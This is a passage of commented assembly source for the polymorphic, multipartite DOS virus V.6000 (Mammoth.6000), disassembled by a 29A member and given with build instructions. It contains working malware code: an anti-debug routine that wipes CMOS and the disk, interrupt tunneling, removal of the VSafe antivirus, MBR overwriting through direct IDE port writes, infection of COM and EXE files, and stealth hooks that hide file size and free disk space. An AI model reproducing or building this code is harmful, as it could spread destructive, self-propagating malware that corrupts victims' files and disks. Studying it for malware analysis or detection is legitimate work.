   ;
   ; Disassembled by Tcp / 29A
   ;
   ; Virus:        V.6000 (aka NoKernel aka Mammoth.6000)
   ; Author:       ?
   ; Country:      Russia (?)
   ; Comments:     Polymorphic, multipartite, tunneling, damage,
   ;               full-stealth, HD-ports,...
   ;               The most interesting feature is that it can
   ;               stay resident after a cold reboot and loading
   ;               from a clean DOS floppy disk!!!!!!!!
   ; WARNING: This is a very dangerous virus!!
   ;
   ; To assembly:
   ;       tasm /m v6000.asm
   ;       tlink v6000
   ;       exe2bin v6000 v6000.com
   ;-------------------------------------------------------------

   .286
   v6000           segment byte public ''
           assume cs:v6000,es:v6000,ss:v6000,ds:v6000
           org 0
   start:
   r_index         db      0B9h    ; mov cx,length_virus+[0..1Fh]
   num_bytes       dw      offset(length_virus)
   r_source        db      0BFh    ; mov di,offset(code_enc)+100h
   st_code_enc     dw      offset(code_enc)+100h
   _loop_dec:
   prefix_op       dw      802Eh   ; xor byte ptr cs:
   r_op            db      35h     ; [di],
   l_mask          db      0       ; l_mask
   i_inc:
           inc     di
   d_loop:
           loop    _loop_dec
           clc
   code_enc:
   delta           equ     word ptr $+1
           mov     bp,offset(start)+100h
           mov     cx,offset(end_virdata)-buffer
           xor     al,al
           mov     di,offset(buffer)
           add     di,bp
           push    cs
           pop     es
           cld
           rep     stosb               ; Clear data area
           cli
           push    cs
           pop     ss
           mov     sp,offset(vstack)
           add     sp,bp
           mov     [bp+delta_offset],bp
           mov     [bp+seg_psp],ds
           mov     dx,word ptr [bp+jmp_antidebug]
           mov     bx,(offset(kill_cmos_hd)-ofs_antidebug-2)
           mov     [bp+jmp_antidebug],0E9h         ; jmp
           mov     [bp+ofs_antidebug],bx
   jmp_antidebug   equ     byte ptr $
   ofs_antidebug   equ     word ptr $+1    ; jmp kill_cmos_hd
                   ; Kill CMOS & HD if debugging (or Pentium!)
           jmp     no_debug
           db      9
   no_debug:
           mov     word ptr [bp+jmp_antidebug],dx   ; Restore jmp
           mov     ax,0B0Bh
           int     21h             ; Resident check
           cmp     ax,0EFEFh       ; Already resident?
           je      restore_host    ; Yes? then jmp
           mov     ah,30h
           int     21h             ; DOS - GET DOS VERSION
                       ; Return: AL = major version number
                       ;         (00h for DOS 1.x)
                       ;         AH = minor version number
           cmp     al,0Ah          ; >DOS 10.xx? (why???)
           ja      restore_host    ; Yes? then jmp
           cmp     al,3                    ; >=DOS 3.00?
           jae     try_to_infect_hd        ; Yes? then jmp
   restore_host:
           cmp     byte ptr [bp+host_type],3       ; EXE?
           je      restore_exe                     ; Yes? then jmp
           push    cs      ; It is a COM file
           pop     ds
           push    cs
           pop     es
           mov     si,offset(header)
           add     si,bp
           mov     di,100h
           mov     bx,di
           movsw           ; Restore original bytes (3 bytes)
           movsb
           cli
           mov     sp,0FFFEh       ; Set default stack
           jmp     bx              ; jmp 100h (exec host)

   restore_exe:
           mov     es,[bp+seg_psp] ; ES:=PSP
           mov     dx,[bp+exeip]
           mov     bx,[bp+relocs]
           mov     cx,es
           add     bx,cx           ; Relocate host CS
           add     bx,10h
           mov     [bp+ep_ip],dx
           mov     [bp+ep_cs],bx
           mov     ax,[bp+reloss]
           add     ax,cx           ; Relocate host SS
           add     ax,10h          ; Add PSP
           push    es
           pop     ds
           push    ax
           xor     ax,ax
           push    ax
           popf                    ; Clear flags
           pop     ax
           cli
           mov     ss,ax           ; Set stack
           mov     sp,cs:[bp+relosp]
           sti
           jmp     dword ptr cs:[bp+ep_ip]         ; Exec host

   try_to_infect_hd:
           call    check4ide
           cmp     al,66h          ; IDE HD?
           jne     start_tunneling ; No? then jmp (don't use ports)
           mov     ax,160Ah
           int     2Fh             ; - Multiplex - MS WINDOWS -
           or      ax,ax           ; Windows running?
           jz      start_tunneling ; Yes? then jmp
   get_vi13:
           mov     al,13h
           call    get_int_vector          ; Get int 13h
           mov     [bp+ofs_i13],bx         ; Store it
           mov     [bp+seg_i13],es
           mov     [bp+use_ports],1        ; Can use ports
           jmp     kill_vsafe

   start_tunneling:
           xor     ax,ax
           mov     ds,ax                   ; DS:=0
           cli
           mov     ds:[1h*4+2],cs          ; Set new int 1
           mov     dx,offset(int_1)
           add     dx,bp
           mov     ds:[1h*4],dx
           sti
           mov     [bp+seg_stop],70h  ; Set stop segment (DOS segment)
           mov     ah,0FFh
           pushf
           pushf
           call    trace_on
           call    dword ptr ds:[13h*4]    ; Trace Int 13h
           call    trace_off
           cmp     [bp+seg_i13],0          ; Tunneling successful?
           jnz     kill_vsafe              ; Yes? then jmp
           jmp     get_vi13
   kill_vsafe:
           mov     dx,5945h
           mov     ax,0FA01h
           int     21h             ; Uninstall VSafe
           call    install_virus
           jmp     restore_host

   install_virus:
           mov     al,10h          ; Diskette drive types
           call    read_cmos
           mov     [bp+floppy_types],ah
           xor     ax,ax
           mov     ds,ax
           mov     ax,ds:[410h]    ; Installed hardware
           mov     [bp+inst_hard],ax
           mov     al,2Eh          ; 1st byte of CMOS checksum
           call    read_cmos
           mov     ch,ah
           mov     al,2Fh          ; 2nd byte of CMOS checksum
           call    read_cmos
           mov     cl,ah
           push    cx
           call    calculate_CMOS_checksum_1
           pop     cx
           cmp     cx,dx           ; Using this method for checksum?
           jne     try_method_ps2  ; No? then jmp
           mov     [bp+chksum_method],0
           jmp     infect_HD

   try_method_ps2:
           mov     al,32h          ; 1st byte of CMOS checksum (PS/2)
           call    read_cmos
           mov     ch,ah
           mov     al,33h          ; 2nd byte of CMOS checksum (PS/2)
           call    read_cmos
           mov     cl,ah
           push    cx
           call    calculate_CMOS_checksum_2
           pop     cx
           cmp     cx,dx           ; Using this method for checksum?
           jne     unknown_method  ; No? then jmp
           mov     [bp+chksum_method],1
           jmp     infect_HD

   unknown_method:
           mov     [bp+chksum_method],2
   infect_HD:
           xor     ah,ah
           mov     dl,80h
           call    int13hbp        ; Reset HD controller
           mov     ah,8
           call    int13hbp        ; Get drive parameters
           inc     ch              ; inc max.cylinder
           mov     dl,80h
           sub     cl,14           ; Get 14 sectors
           mov     ax,030Ch        ; 12 sectors to write (its code)
           push    cs
           pop     es
           mov     bx,bp
           call    int13hbp        ; Write to HD
           jnc     read_mbr        ; Ok? then jmp
           jmp     _ret            ; Stupid jmp!!

   read_mbr:
           mov     ax,0201h
           mov     bx,offset(s_mbr)
           add     bx,bp
           mov     dx,80h
           mov     cx,1
           int     13h             ; Read MBR
           jnc     check_mbr       ; Ok? then jmp
           jmp     _ret            ; Stupid jmp!!

   check_mbr:
           mov     di,bx
           push    cs
           pop     ds
           mov     si,offset(mbr_code)
           add     si,bp
           mov     cx,(tmbr_code-mbr_code)
           cld
           rep     cmpsb           ; Infected?
           jne     infect_mbr      ; No? then jmp
           jmp     _ret            ; Stupid jmp!!

   infect_mbr:
           call    get_random
           mov     [bp+mask_orig_mbr],ah
           mov     si,bx
           mov     cx,512
           push    cx
   encrypt_orig_mbr:
           xor     [si],ah
           inc     si
           loop    encrypt_orig_mbr
           push    ax
           mov     ah,8
           call    int13hbp        ; Get drive parameters
           inc     ch              ; Inc cylinder
           dec     cl              ; Dec sector
           mov     dl,80h
           mov     ax,301h         ; 1 sector to write
           call    int13hbp        ; Write encripted MBR
           mov     si,bx
           pop     ax
           pop     cx
   decrypt_orig_mbr:
           xor     [si],ah         ; Decrypt MBR
           inc     si
           loop    decrypt_orig_mbr
           call    get_random
           mov     si,offset(st_mbr_enc)
           add     si,bp
           mov     cx,end_mbr_code-st_mbr_enc
           push    si
           push    cx
           push    ax
   encrypt_mbr:
           mov     cs:[bp+mask_mbr],ah     ; Encrypt new MBR code
           xor     [si],ah
           inc     si
           loop    encrypt_mbr
           mov     si,offset(mbr_code)
           add     si,bp
           mov     di,bx
           mov     cx,end_mbr_code-mbr_code
           rep     movsb
           cmp     [bp+use_ports],1        ; Can use ports?
           je      write_using_ports       ; Yes? then jmp
           mov     ax,301h         ; 1 sector to write
           mov     cx,1
           xor     dh,dh
           call    int13hbp        ; Write new mbr
           jmp     mbr_wrote

   wait_while_busy:
           mov     dx,1F7h
   HD_busy:
           in      al,dx           ; AT hard disk
                       ; status register bits:
                       ; 0: 1=prev cmd error
                       ; 2: Corrected data
                       ; 3: Data Request. Buffer is busy
                       ; 4: Seek completed
                       ; 5: Write fault
                       ; 6: Drive ready (unless bit 4=0)
                       ; 7: Busy
           test    al,80h          ; Busy?
           jnz     HD_busy         ; Yes? Repeat while busy
           ret

   wait_while_busy_seek:
           mov     dx,1F7h
   in_seek:
           in      al,dx           ; AT hard disk
                       ; status register bits:
                       ; 0: 1=prev cmd error
                       ; 2: Corrected data
                       ; 3: Data Request. Buffer is busy
                       ; 4: Seek completed
                       ; 5: Write fault
                       ; 6: Drive ready (unless bit 4=0)
                       ; 7: Busy
           test    al,80h          ; HD busy?
           jnz     in_seek         ; Yes? Repeat while busy
           test    al,8            ; Seek completed?
           jz      in_seek         ; No? Repeat until seek completed
           ret

   write_using_ports:
           mov     si,bx
           cld
           mov     dx,3F6h
           mov     al,4
           out     dx,al           ; Enable FDC disk reset
           call    waste_time
           mov     al,0
           out     dx,al
           call    wait_while_busy
           mov     dx,1F6h
           mov     al,10100000b
   ;                             ^^^^^head 0
   ;                             |___drive 0
           out     dx,al   ; AT hard disk controller: Drive & Head.
           call    waste_time
           mov     dx,1F7h
           mov     al,10h
           out     dx,al   ; AT hard disk command register:
                   ; 1?H = Restore to cylinder 0
                   ; 7?H = Seek to cylinder
                   ; 2?H = Read sector
                   ; 3xH = Write sector
                   ; 50H = Format track
                   ; 4xH = verify read
                   ; 90H = diagnose
                   ; 91H = set parameters for drive
                   ; Recalibrate drive
           call    wait_while_busy
           mov     dx,1F1h
           in      al,dx   ; AT hard disk controller
                   ; Error register. Bits for last error:
                   ; 0: Data Address Mark not found
                   ; 1: Track 0 Error
                   ; 2: Command aborted
                   ; 4: Sector ID not found
                   ; 6: ECC Error: Uncorrectable data error
                   ; 7: Bad block
           and     al,01101000b
           jnz     write_using_ports       ; Error? try again
           call    wait_while_busy
           mov     dx,1F2h
           mov     al,1    ; One sector
           out     dx,al   ; AT hard disk controller: Sector count.
           call    waste_time
           mov     dx,1F3h
           mov     al,1    ; Start in sector 1
           out     dx,al   ; AT hard disk controller: Sector number.
           call    waste_time
           mov     dx,1F4h
           mov     al,0
           out     dx,al   ; AT hard disk controller:
                   ; Cylinder high (bits 0-1 are bits 8-9
                   ;                of 10-bit cylinder number)
           call    waste_time
           mov     dx,1F5h
           mov     al,0    ; Cylinder 0
           out     dx,al   ; AT hard disk controller:
                   ; Cylinder low (bits 0-7 of 10-bit
                   ;               cylinder number)
           call    waste_time
           mov     dx,1F6h
           mov     al,10100000b    ; Drive 0, Head 0
           out     dx,al   ; AT hard disk controller: Drive & Head.
           call    waste_time
           mov     dx,1F7h
           mov     al,31h          ; Write sector without retry
           out     dx,al           ; AT hard disk
                       ; command register:
                       ; 1?H = Restore to cylinder 0
                       ; 7?H = Seek to cylinder
                       ; 2?H = Read sector
                       ; 3xH = Write sector
                       ; 50H = Format track
                       ; 4xH = verify read
                       ; 90H = diagnose
                       ; 91H = set parameters for drive
           call    wait_while_busy_seek
           mov     cx,512/2        ; Number of words to write (1 sector)
           mov     dx,1F0h         ; Data register
           rep     outsw           ; Write sector
           call    wait_while_busy
   mbr_wrote:
           pop     ax
           pop     cx
           pop     si
   dec_mbrcode:
           xor     cs:[si],ah
           inc     si
           loop    dec_mbrcode
           mov     ah,8
           mov     dl,80h
           call    int13hbp        ; Get drive parameters
           mov     dl,80h
           inc     ch              ; inc cylinder
           sub     cl,2            ; dec sector*2
           mov     word ptr cs:[bx],0      ; Reset boot counter
           mov     ax,0301h        ; 1 sector to write
           call    int13hbp        ; Write to HD
   _ret:
           ret


   int_1:                                  ; Tunneler code
           push    bx
           push    es
           push    si
           push    bp
           push    ds
           mov     bp,sp
           lds     si,[bp+0Ah]     ; Get next inst.address from stack
           mov     bp,cs
           mov     bx,ds
           cmp     bx,bp           ; Is from virus code?
           je      end_int1        ; Yes? then jmp
           mov     bp,sp
   delta_offset    equ     word ptr $+1
           mov     bx,0B3Ah                ; mov bx,delta_offset
           cmp     byte ptr [si],9Ch       ; Next inst. is a pushf?
           jne     check_popf              ; No? then jmp
           inc     word ptr [bp+0Ah]       ; Skip the pushf
           mov     cs:[bx+emul_pushf],1
   check_popf:
           cmp     byte ptr [si],9Dh       ; Next inst. is a popf?
           jne     no_popf                 ; No? then jmp
           or      word ptr [bp+10h],100h  ; Put flag trace in stack
   no_popf:
           mov     bp,ds
           cmp     cs:[bx+tunnel_ok],1     ; Found int?
           je      end_int1                ; Yes? then jmp
           cmp     bp,cs:[bx+seg_stop]     ; Above stop segment?
           ja      end_int1                ; Yes? then jmp
           mov     cs:[bx+ofs_i13],si      ; Store as the new int
           mov     cs:[bx+seg_i13],ds
           mov     cs:[bx+tunnel_ok],1     ; Found int
   end_int1:
           pop     ds
           pop     bp
           pop     si
           pop     es
           cmp     cs:[bx+emul_pushf],1    ; Was found a pushf?
           je      no_restore_flags        ; Yes? then jmp
           pop     bx
           iret
   no_restore_flags:
           mov     word ptr cs:[bx+emul_pushf],0
           pop     bx
           retf

   waste_time:
           jmp     $+2
           jmp     $+2
           ret

   trace_on:
           pushf
           pop     bx
           or      bh,1    ; Set trace flag on
           push    bx
           popf
           ret
   trace_off:
           pushf
           pop     bx
           and     bh,0FEh         ; Set trace flag off
           push    bx
           popf
           ret

   check4ide:
           push    ds
           mov     dl,80h          ; 1st HD
           push    dx
           mov     ah,15h
           int     13h             ; DISK - GET TYPE
                       ; DL = drive ID
                       ; Return: CF set on error
                       ;         AH = disk type
                       ; Get type of 1st HD
           pop     dx
           cmp     ah,1            ; Type 1? Diskette???
           je      no_ide          ; Yes? then jmp
           xor     ax,ax
           mov     ds,ax           ; DS:=0
           les     si,ds:[41h*4]   ; Get hd0 parameters pointer
           mov     ax,es:[si]      ; Maximun number of cylinders
           push    ax
           push    dx
           mov     ah,8
           int     13h     ; Get current drive parameters
           mov     ax,cx
           rol     al,1
           rol     al,1
           and     al,3    ; Get high order 2 bits of cylinder count
           xchg    al,ah   ; Cylinder count in AX
           and     dh,0C0h ; Get high order 2 bits of head count
                   ;  Large Model(?)
           mov     cl,4
           shl     dh,cl
           or      ah,dh   ; Total cylinder count in AX
           add     ax,2    ; Add 2 cylinders
           pop     dx
           mov     bx,ax
           pop     ax
           cmp     bx,ax   ; Same cylinder number?
           xor     al,al   ; BUG!!!! This instruction sets the Z-flag
           jne     no_ide  ; Then this jump is never used
           mov     al,66h
   no_ide:
           pop     ds
           ret

   fffnfcb:
           call    int21h          ; FF/FN
           or      al,al           ; More files?
           jnz     no_files_fcb    ; No? then jmp
           pushf
           call    push_registers
           mov     ah,2Fh
           call    int21h          ; Get DTA
           push    es
           pop     ds
           push    bx
           pop     dx
           cmp     byte ptr es:[bx],0FFh   ; Extended FCB?
           jnz     no_ext_fcb              ; No? then jmp
           add     dx,7
   no_ext_fcb:
           call    make_fname
           call    exe_or_com?
           or      bp,bp           ; EXE or COM?
           jz      error_open_fcb  ; No? then jmp
           mov     ax,3D00h
           call    int21h          ; Open file
           jc      error_open_fcb
           mov     bx,ax           ; bx:=handle
           mov     ax,5700h
           call    int21h          ; Get file time
           rcr     dh,1
           cmp     dh,64h          ; Infected?
           jb      no_inf_fcb      ; No? then jmp
           push    bx
           mov     ah,2Fh
           call    int21h          ; Get DTA
           cmp     byte ptr es:[bx],0FFh   ; Extended FCB?
           jne     no_ext_fcb2             ; No? then jmp
           add     bx,7
   no_ext_fcb2:
           sub     word ptr es:[bx+1Dh],offset(length_virus)
           mov     ax,es:[bx+19h]          ; Get file date
           rcr     ah,1
           pushf
           sub     ah,100          ; Set original date
           popf
           rcl     ah,1
           mov     es:[bx+19h],ax
           pop     bx
   no_inf_fcb:
           mov     ah,3Eh
           call    int21h          ; Close file
   error_open_fcb:
           call    pop_registers
           popf
   no_files_fcb:
           retf    2

   rename_FCB:
           push    ds
           push    dx
           call    make_fname
           jmp     rename

   rename_handle:
           push    ds
           push    dx
   rename:
           push    es
           push    si
           push    di
           push    cx
           push    bp
           push    ax
           push    es
           push    di
           call    exe_or_com?
           pop     di
           pop     es
           or      bp,bp           ; Renaming from Exe or Com?
           jz      jmp_end_i21     ; No? then jmp
           push    ds
           push    dx
           push    es
           pop     ds
           mov     dx,di
           call    exe_or_com?
           pop     dx
           pop     ds
           or      bp,bp           ; Renaming to Exe or Com?
           jnz     now_is_exec     ; Yes? then jmp
           call    disinfect_file  ; else disinfect
           jmp     jmp_end_i21

   now_is_exec:
           call    try_to_infect_file
   jmp_end_i21:
           pop     ax
           pop     bp
           pop     cx
           pop     di
           pop     si
           pop     es
           pop     dx
           pop     ds
           jmp     exit_i21

   disinfect:
           push    dx
           cmp     ah,6Ch          ; Extended create/open?
           jne     exec?           ; No? then jmp
           test    dl,1            ; Action=open file?
           jz      not_open        ; No? then jmp
           mov     dx,si
   exec?:
           cmp     ah,4Bh          ; Exec file?
           jne     no_exec         ; No? then jmp
           push    ax
           push    si
           push    di
           push    es
           push    cx
           push    ds
           mov     cs:ticks_disableFD,30*18        ; 30 seconds
           or      cs:flags,2      ; Don't disable FD
           call    enable_FD
           mov     si,dx
           call    end_fname
           dec     si
           mov     di,offset(end_chkdsk)
           mov     cx,end_chkdsk-end_wswap
           push    cs
           pop     es
           call    cmp_strings     ; chkdsk.exe?
           jnc     no_chkdsk       ; No? then jmp
           or      cs:flags,80h    ; No stealth
   no_chkdsk:
           pop     ds
           pop     cx
           pop     es
           pop     di
           pop     si
           pop     ax
   no_exec:
           test    cs:flags,1      ; bit0 never is 1!!! I think...
           jnz     not_open        ;  then this jump is never used
           call    disinfect_file
   not_open:
           pop     dx
           jmp     exit_i21

   fffnh:
           call    int21h          ; Find-first/next
           jc      ret_fffnh       ; jmp if no more files
           pushf
           call    push_registers
           mov     ah,2Fh
           call    int21h          ; Get DTA
           push    es
           pop     ds
           mov     dx,bx
           add     dx,1Eh
           call    exe_or_com?     ; if bp=0 then not exe/com
           or      bp,bp           ; Exe or Com?
           jz      end_fffnh       ; No? then jmp
           mov     ax,[bx+(dta_date-dta)]
           shr     ah,1
           cmp     ah,64h          ; Infected?
           jb      end_fffnh       ; No? then jmp
           mov     ax,es:[bx+(dta_date-dta)]       ; Get file date
           rcr     ah,1
           pushf
           sub     ah,100          ; Set original date
           popf
           rcl     ah,1
           mov     es:[bx+(dta_date-dta)],ax
           sub     [bx+(dta_sizel-dta)],offset(length_virus)
   end_fffnh:
           call    pop_registers
           popf
   ret_fffnh:
           retf    2

   jmp_infect_on_exit:
           jmp     infect_on_exit

   int_21:
           mov     cs:into_i21,1
           cmp     ah,4Ch          ; Exit program via ah=4Ch?
           je      jmp_infect_on_exit      ; Yes? then jmp (infect)
           or      ah,ah           ; Exit program via ah=0?
           jz      jmp_infect_on_exit      ; Yes? then jmp (infect)
           cmp     ah,31h          ; Exit program via ah=31h (TSR)?
           je      jmp_infect_on_exit      ; Yes? then jmp (infect)
           cmp     ax,0B0Bh        ; Our check?
           je      resident_check  ; Yes? then jmp
           test    cs:flags,80h    ; Do stealth?
           jnz     exit_i21        ; No? then jmp
           cmp     ah,4Bh          ; Exec?
           je      jmp_disinfect   ; Yes? then jmp (disinfect)
           cmp     ah,11h          ; FF FCB?
           je      jmp_fffnfcb     ; Yes? then jmp (length stealth)
           cmp     ah,12h          ; FN FCB?
           je      jmp_fffnfcb     ; Yes? then jmp (length stealth)
           cmp     ah,4Eh          ; FF handle?
           je      fffnh           ; Yes? then jmp (length stealth)
           cmp     ah,4Fh          ; FN handle?
           je      fffnh           ; Yes? then jmp (length stealth)
           cmp     ah,3Dh          ; Open?
           je      jmp_disinfect   ; Yes? then jmp (disinfect)
           cmp     ah,6Ch          ; Extended open?
           je      jmp_disinfect   ; Yes? then jmp (disinfect)
           cmp     ah,36h          ; Get Disk free?
           je      disk_free       ; Yes? then jmp (free space stealth)
           cmp     ah,0Fh          ; Open file using FCB?
           je      open_delete_FCB ; Yes? then jmp (infect)
           cmp     ah,13h          ; Delete file using FCB?
           je      open_delete_FCB ; Yes? then jmp (infect)
           cmp     ah,17h          ; Rename file using FCB?
           je      jmp_rename_FCB  ; Yes? then jmp (infect/disinfect)
           cmp     ah,41h          ; Delete file?
           je      del_getsetattr  ; Yes? then jmp (infect)
           cmp     ah,56h          ; Rename file?
           je      jmp_rename      ; Yes? then jmp (infect/disinfect)
           cmp     ax,4300h        ; Get attributes?
           je      del_getsetattr  ; Yes? then jmp (infect)
           cmp     ax,4301h        ; Set attributes?
           je      del_getsetattr  ; Yes? then jmp (infect)
           cmp     ah,3Eh          ; Close file?
           je      jmp_close       ; Yes? then jmp (infect)
   exit_i21:
           mov     cs:into_i21,0
           jmp     dword ptr cs:ofs_i21
   resident_check:
           mov     ax,0EFEFh
           iret
   del_getsetattr:
           jmp     jmp_try_infect_file
   jmp_close:
           jmp     close
   jmp_fffnfcb:
           jmp     fffnfcb
   jmp_disinfect:
           jmp     disinfect
   jmp_rename:
           jmp     rename_handle
   jmp_rename_FCB:
           jmp     rename_FCB

   open_delete_FCB:
           push    ds
           push    dx
           call    make_fname
           call    try_to_infect_file
           pop     dx
           pop     ds
           jmp     exit_i21

   save_free:
           mov     cs:into_i21,0
           mov     cs:stored_psp,bx        ; Store program PSP dir
           mov     cs:stored_drive,dl      ; Store drive
           pop     bx
           call    int21h                  ; Get free space
           mov     cs:clusters_avail,bx    ; Store free space
           retf    2

   disk_free:
           push    bx
           push    ax
           mov     ah,62h
           call    int21h          ; Get PSP address in BX
           pop     ax
           cmp     bx,cs:stored_psp        ; Same program?
           jne     save_free               ; No? then jmp
           cmp     dl,cs:stored_drive      ; Same drive?
           jne     save_free               ; No? then jmp
           pop     bx
           call    int21h                  ; Get free space
           mov     bx,cs:clusters_avail    ; Return previous free space
           retf    2

   int_27:
           push    cx
           mov     cl,4
           shr     dx,cl           ; div 16
           pop     cx
           inc     dx              ; inc paragraphs
           mov     ax,3100h        ; To exec int 21h, AX=3100 (TSR)
           jmp     infect_on_exit

   int_20:
           xor     ax,ax           ; To exec int 21h, AX=0 (exit)
   infect_on_exit:
           push    ax
           push    ds
           push    dx
           push    bx
           pushf
           push    cs
           pop     ds
           cmp     activity_checks,1       ; Checking activity?
           jne     set_checks              ; No? then jmp
           jmp     ints_set

   set_checks:
           mov     activity_checks,1
           mov     ah,34h
           call    int21h          ; Get address of DOS activity flag
           mov     ofs_flagdos,bx  ; Store it
           mov     seg_flagdos,es
           mov     al,8
           call    get_int_vector  ; Get int 8
           mov     ofs_i8,bx       ; Store it
           mov     seg_i8,es
           mov     al,17h
           call    get_int_vector  ; Get int 17h
           mov     ofs_i17,bx      ; Store it
           mov     seg_i17,es
           mov     al,25h
           call    get_int_vector  ; Get int 25h
           mov     ofs_i25,bx      ; Store it
           mov     seg_i25,es
           mov     al,26h
           call    get_int_vector  ; Get int 26h
           mov     ofs_i26,bx      ; Store it
           mov     seg_i26,es
           mov     ax,5D06h
           call    int21h          ; Get address of DOS swappable area
           mov     cs:ofs_swpdos,si        ; Store it
           mov     cs:seg_swpdos,ds
           xor     ax,ax
           mov     ds,ax
           cli
           mov     word ptr ds:[8h*4],offset(int8)         ; Set int 8
           mov     ds:[8h*4+2],cs
           mov     word ptr ds:[17h*4],offset(int17)       ; Set int 17h
           mov     ds:[17h*4+2],cs
           mov     word ptr ds:[25h*4],offset(int25)       ; Set int 25h
           mov     ds:[25h*4+2],cs
           mov     word ptr ds:[26h*4],offset(int26)       ; Set int 26h
           mov     ds:[26h*4+2],cs
           sti
           mov     si,400h         ; Address of COM ports
           mov     di,offset(com_ports)
           push    cs
           pop     es
           movsw           ; com1
           movsw           ; com2
           movsw           ; com3
           movsw           ; com4
   ints_set:
           test    cs:flags,40h    ; bit14 never is 1!!! I think...
           jnz     get_parent_psp  ;  then this jump is never used
           call    get_fname_env
   get_parent_psp:
           mov     ah,62h
           call    int21h          ; Get current PSP address
           mov     ds,bx
           mov     ax,ds:[16h]     ; Get parent PSP
           mov     ds,ax
           mov     ax,ds:[16h]     ; Get parent PSP (of parent PSP :)
           mov     bx,ds
           cmp     ax,bx       ; Same PSP? Parent=command interpreter?
           jne     no_reset_flags  ; No? then jmp
           and     cs:flags,0      ; Clear flags
   no_reset_flags:
           popf
           pop     bx
           pop     dx
           pop     ds
           pop     ax
           mov     cs:into_i21,0
           jmp     dword ptr cs:ofs_i21

   close:
           call    push_registers
           push    bx
           call    set_i24_i1B_i23
           call    get_ofs_fname
           pop     bx
           clc
           mov     ax,1220h
           int     2Fh     ; GET JOB FILE TABLE ENTRY
                   ; BX = file handle
                   ; Return: CF set on error, AL = 6
                   ;         CF clear if successful
                   ;         ES:DI -> JFT entry for file handle
                   ;                  in current process
           jc      end_close
           cmp     byte ptr es:[di],0FFh   ; No table?
           je      end_close               ; Yes? then jmp
           clc
           push    bx
           mov     bl,es:[di]      ; Get file entry number
           xor     bh,bh
           mov     ax,1216h
           int     2Fh     ; GET ADDRESS OF SYSTEM FILE TABLE
                   ; BX = system file table entry number
                   ; Return: CF clear if successful,
                   ;         ES:DI -> system file table entry
                   ;         CF set if BX greater than FILES=
           pop     bx
           jc      end_close
           push    es
           pop     ds
           and     word ptr [di+2],0FFF8h
           or      word ptr [di+2],2       ; File open mode 2 (I/O)
           add     di,cs:ofs_sft
           mov     dx,di
           dec     dx
           call    make_fname
           push    cs
           pop     ds
           mov     dx,offset(filename)
           call    infect_file
   end_close:
           call    restore_i24_i1b_i23
           call    pop_registers
           jmp     exit_i21

   jmp_try_infect_file:
           call    try_to_infect_file
           jmp     exit_i21

   push_registers:
           pop     cs:return_dir
           push    ax
           push    bx
           push    cx
           push    dx
           push    es
           push    ds
           push    si
           push    di
           push    bp
           jmp     cs:return_dir

   pop_registers:
           pop     cs:return_dir
           pop     bp
           pop     di
           pop     si
           pop     ds
           pop     es
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           jmp     cs:return_dir

   get_fname_env:
           call    push_registers
           mov     ah,62h
           call    int21h          ; Get PSP address in BX
           mov     ds,bx
           mov     ds,ds:[2Ch]     ; Get environment segment
           xor     si,si
           mov     cx,400h
   search4fname:
           mov     ax,[si]                 ; Get word
           or      ax,ax                   ; Zero?
           jz      no_more_variables       ; Yes? then jmp
           inc     si
           loop    search4fname
           jmp     _pop_regs

   no_more_variables:
           add     si,4            ; Pathname of environment owner
           mov     dx,si
           call    try_to_infect_file
   _pop_regs:
           call    pop_registers
           ret

   try_to_infect_file:
           call    push_registers
           call    normalize_fname
           call    set_i24_i1B_i23 ; Set ints
           call    get_reset_attr  ; Save & reset attributes
           jc      error_writing
           mov     ax,3D02h
           call    int21h          ; Open file I/O
           jc      error_writing
           mov     bx,ax           ; bx:=handle
           call    infect_file
           mov     ah,3Eh
           call    int21h          ; Close file
           call    restore_attr    ; Restore attributes
   error_writing:
           call    restore_i24_i1b_i23
           call    pop_registers
           ret

   st_command      equ     $-1
           db      'COMMAND.'
   ext_com         db      'COM'
   end_command     equ     word ptr $-1
   gdi_exe         db      'GDI.EXE'
   end_gdi         equ     word ptr $-1
           db      'DOSX.EXE'
   end_dosx        equ     word ptr $-1
           db      'WIN386.EXE'
   end_win386      equ     word ptr $-1
           db      'KRNL286.EXE'
   end_krnl286     equ     word ptr $-1
           db      'KRNL386.EXE'
   end_krnl386     equ     word ptr $-1
           db      'USER.'
   bad_end_user    equ     word ptr $-2
   ext_exe         db      'EXE'
   end_user        equ     word ptr $-1
           db      'WSWAP.EXE'
   end_wswap       equ     word ptr $-1
           db      'CHKDSK.EXE'
   end_chkdsk      equ     word ptr $-1

   normalize_fname:
           push    ds
           pop     es
           push    dx
           pop     si
           push    si
           pop     di
           mov     ax,1211h
           int     2Fh     ; NORMALIZE ASCIZ FILENAME
                   ; DS:SI -> ASCIZ filename to normalize
                   ; ES:DI -> buffer for normalized filename
                   ; Return: destination buffer filled with
                   ; uppercase filename, with slashes turned
                   ; to backslashes
           ret

   cmp_strings:            ; Compare two strings
               ; OUTPUT: Carry=1 if strings are equal
           std
   next_char:
           lodsb
           cmp     al,' '
           je      next_char       ; Ignore spaces
           inc     si
           cmpsb
           loope   next_char
           clc
           or      cx,cx           ; Matching strings?
           jnz     no_match        ; No? then jmp
           stc                     ; Set carry
   no_match:
           ret

   infect_file:
           push    ds
           push    dx
           call    exe_or_com?
           or      bp,bp           ; Exe or Com?
           jz      not_infect      ; No? then jmp
           push    bp
           call    cmp_fname       ; Valid filename?
           pop     bp
           jc      not_infect      ; No? then jmp
           mov     ax,4200h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek start
           jc      not_infect
           call    read_header
           jc      not_infect
           call    check_if_exe
           call    check_if_infected       ; Already infected?
           jz      not_infect              ; Yes? then jmp
           call    get_ftime
           call    write_virus
           jc      not_infect
           call    restore_ftime
   not_infect:
           pop     dx
           pop     ds
           ret

   restore_ftime:
           mov     ax,5701h
           mov     cx,cs:f_time
           mov     dx,cs:f_date
           call    int21h          ; Restore file date & time
           ret

   restore_attr:
           mov     ax,4301h
           mov     cx,cs:attribs
           call    int21h          ; Restore attributes
           ret

   get_ftime:
           mov     ax,5700h
           call    int21h          ; Get file time
           mov     cs:f_time,cx
           mov     cs:f_date,dx
           ret

   get_reset_attr:
           mov     ax,4300h
           call    int21h          ; Get attributes
           mov     cs:attribs,cx   ; Store attributes
           mov     ax,4301h
           xor     cx,cx
           call    int21h          ; Reset attributes
           ret

   check_if_exe:
           cmp     cs:_signature,5A4Dh     ; EXE?
           jz      is_exe                  ; Yes? then jmp
           cmp     cs:_signature,4D5Ah     ; EXE?
           jz      is_exe                  ; Yes? then jmp
           mov     bp,1                    ; It's COM
           ret
   is_exe:
